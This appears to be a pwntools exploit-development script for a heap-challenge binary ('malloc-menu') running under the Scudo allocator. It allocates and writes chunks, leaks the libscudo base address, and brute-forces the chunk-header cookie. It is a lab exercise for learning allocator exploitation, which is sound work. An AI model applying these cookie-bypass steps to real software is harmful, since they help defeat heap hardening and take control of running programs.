#!/usr/bin/python3
from pwn import *
from utils import *
from scudocookie import bruteforce, calc_checksum
from crc32c import crc32c

elf = context.binary = ELF("malloc-menu-linux/malloc-menu-linux")

gs = '''
source ./malloc-menu-linux/scudo-69d4e5ae7b97.py
continue
'''

SCUDO_LIB = os.path.realpath("malloc-menu-linux/libscudo-linux.so") 
env = {"LD_PRELOAD": SCUDO_LIB}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=5",
        "quarantine_size_kb=10",
        "quarantine_max_chunk_size=2048",
        "release_to_os_interval_ms=-1"
    ])

    
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, env=env)
    else:
        return process(elf.path, env=env, stdin=PTY)

# Select the "malloc" option, send size & data.
   
io = start()


# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# The malloc() function chooses option 1 and then 3 from the menu.
# Its arguments are "size" and "data".
ind1, add1 = malloc(io, 24, b"Y"*24)
ind2, add2 = malloc(io, 24, b"X"*24)

info(f"address 1: {hex(add1)} address 2: {hex(add2)}")

write(io, add1, b"X"*12)
write(io, add2, b"Y"*12)

scudo_base = get_libscudo_base(io, SCUDO_LIB)
info(f"lib-scudo base: {hex(scudo_base)}")

cookie_cheat = get_cookie_cheat(io, scudo_base)
info(f"cheated cookie: {hex(cookie_cheat)}")
cookie = bruteforce_cookie(io, add1)

info(f"Bruteforced cookie: {hex(cookie)}")

io.interactive()

free(io, add1)
free(io, add2)

#populate_quarantine()

# =============================================================================

io.interactive()
